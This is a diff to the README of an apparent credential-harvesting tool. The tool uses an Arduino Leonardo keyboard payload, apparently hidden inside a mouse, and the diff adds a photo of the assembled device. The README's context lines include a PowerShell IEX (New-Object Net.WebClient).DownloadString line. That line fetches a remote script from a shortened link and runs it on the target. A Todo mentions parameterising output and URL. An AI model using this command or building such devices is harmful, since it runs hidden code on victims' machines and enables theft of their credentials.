@@ -21,5 +21,7 @@ Performs the following task
 Keyboard_payload.ino works for Arduino leonard with swedish keyboard
 Will run IEX (New-Object Net.WebClient).DownloadString("https://bit.ly/2El9Fyw")
 
+![alt text](https://raw.githubusercontent.com/mattiasgrondahl/GetCredentials/master/IntelliMouse30_assembled.PNG)
+
 #Todo
 Figure out how to pass parameters while using IEX to be able to modify -output and -url parameter
